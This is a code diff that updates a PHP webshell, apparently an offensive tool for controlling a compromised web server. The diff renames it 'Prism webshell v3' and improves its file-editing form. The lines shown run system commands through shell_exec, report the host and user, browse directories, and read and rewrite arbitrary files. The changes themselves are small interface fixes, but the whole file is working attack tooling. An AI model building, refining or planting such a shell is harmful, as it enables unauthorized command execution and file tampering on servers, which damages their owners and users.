@@ -1,11 +1,12 @@
 <?php
-define('SCRIPT_NAME', 'Attack webshell v2.9');
+define('SCRIPT_NAME', 'Prism webshell v3');
 
 $current_directory = getcwd();
 $current_device = shell_exec('uname -a');
 $current_user = shell_exec('whoami');
 $command_output = '';
 $file_content = '';
+$openedFile = false;
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 	if (!empty($_POST['change_dir'])) {
@@ -16,7 +17,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 		} else {
 			chdir(dirname($target_dir));
 			$current_directory = getcwd();
-			$file_content = file_get_contents($target_dir);
+            $file_content = file_get_contents($target_dir);
+            $openedFile = true;
 		}
 	}
 	
@@ -119,9 +121,10 @@ $directory_contents = getDirectoryContents($current_directory);
 </form>
 <pre><?php echo htmlspecialchars($command_output); ?></pre>
 
-<?php if (!empty($file_content)): ?>
+<?php if ($openedFile): ?>
 <h3>Editing: <?php echo htmlspecialchars($_POST['change_dir']); ?></h3>
 <form method="post">
+<input type="hidden" name="change_dir" value="<?php echo htmlspecialchars($current_directory); ?>">
 <textarea name="file_content"><?php echo htmlspecialchars($file_content); ?></textarea><br>
 <input type="hidden" name="update_file" value="<?php echo htmlspecialchars($_POST['change_dir']); ?>">
 <button type="submit">Save Changes</button>
@@ -221,6 +224,10 @@ function resizeInput(el) {
     el.style.width = 'auto';
     // Set width to the scrollWidth (total width of the content)
     el.style.width = (el.scrollWidth + 10) + 'px'; // Add a bit of padding
+    const maxWidth = window.innerWidth * 0.8; // Set a max width (e.g., 80% of the screen width)
+    if (el.scrollWidth > maxWidth) {
+      el.style.width = maxWidth + 'px';
+    }
   }
 </script>
 </body>
